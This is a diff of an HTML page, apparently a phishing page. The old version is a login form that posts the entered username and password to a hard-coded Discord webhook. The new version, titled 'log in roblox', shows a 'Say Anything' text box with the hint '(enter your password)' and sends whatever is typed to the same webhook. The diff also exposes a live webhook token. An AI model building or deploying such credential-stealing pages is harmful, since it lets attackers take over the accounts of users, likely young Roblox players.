@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Page</title>
+  <title>log in roblox </title>
   <style>
     body {
-      background: #111;
-      color: #fff;
-      font-family: 'Arial', sans-serif;
+      background-color: #111;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -17,69 +17,68 @@
     }
 
     h1 {
+      color: #0ff;
       margin-bottom: 20px;
-      font-size: 28px;
-      color: #00ffff;
     }
 
-    input {
-      padding: 12px;
-      margin: 10px;
-      width: 250px;
+    textarea {
+      width: 300px;
+      height: 150px;
+      background: #222;
+      color: #fff;
       border: none;
       border-radius: 5px;
-      font-size: 16px;
-      background-color: #222;
-      color: #fff;
+      padding: 10px;
+      resize: none;
     }
 
     button {
-      padding: 12px 30px;
-      font-size: 16px;
+      margin-top: 10px;
+      padding: 10px 20px;
+      background: #0ff;
+      color: #000;
+      font-weight: bold;
       border: none;
       border-radius: 5px;
-      background-color: #00ffff;
-      color: #000;
       cursor: pointer;
-      margin-top: 20px;
     }
 
-    button:hover {
-      background-color: #00cccc;
+    .note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
     }
   </style>
 </head>
 <body>
-
-  <h1>Welcome Back!</h1>
-
-  <input type="text" id="username" placeholder="Enter username">
-  <input type="password" id="password" placeholder="Enter password">
-  <button onclick="login()">Log In</button>
+  <h1>Say Anything</h1>
+  <textarea id="message" placeholder="Type your message here..."></textarea>
+  <button onclick="sendMessage()">Send</button>
+  <div class="note">(enter your password)</div>
 
   <script>
-    function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
+    function sendMessage() {
+      const content = document.getElementById('message').value;
+      if (!content) return alert("Type something first!");
 
-      if (user && pass) {
-        alert("Username: " + user + "\nPassword: " + pass);
-
-        // Send a funny message to the Discord webhook
-        fetch("https://discord.com/api/webhooks/1375957579745988662/_DKC_oGnZ8DRmIhn0H83Y_Gzr5ybbhRcLFVO4PWLkJeP-EqEkztQn4o9HHPZYlJWssmp", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: 👤 User **${user}** just said they’re so sigma with password **${pass}** 💀
-          })
-        });
-      } else {
-        alert("⚠️ Fill in both fields, sigma warrior.");
-      }
+      fetch("https://discord.com/api/webhooks/1375957579745988662/_DKC_oGnZ8DRmIhn0H83Y_Gzr5ybbhRcLFVO4PWLkJeP-EqEkztQn4o9HHPZYlJWssmp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      })
+      .then(res => {
+        if (res.ok) {
+          alert("Sent ✅");
+          document.getElementById('message').value = "";
+        } else {
+          alert("Failed to send ❌");
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        alert("Error sending message.");
+      });
     }
   </script>
-
 </body>
 </html>
